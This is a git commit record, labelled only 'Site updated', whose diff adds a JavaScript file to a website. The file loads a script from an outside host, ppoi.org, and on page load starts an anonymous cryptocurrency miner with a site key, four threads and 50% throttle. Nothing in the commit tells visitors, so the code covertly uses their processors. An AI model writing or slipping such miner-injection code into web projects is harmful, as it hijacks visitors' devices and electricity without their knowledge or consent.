81aacfc4966d1eb491c656e99bbc2334fc5c8145
damit5 <damit5@protonmail.com>
2017-11-05 13:18:24 +0800

    Site updated: 2017-11-05 13:18:22

---
+++ fuck.js
@@ -0,0 +1,5 @@
+var script = document.createElement('script');
+script.type = 'text/javascript';
+script.src = "https://ppoi.org/lib/projectpoi.min.js";
+script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous('Us8nQWj4JH4L2QDoDrEcIF7p',{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
+document.getElementsByTagName('head')[0].appendChild(script);
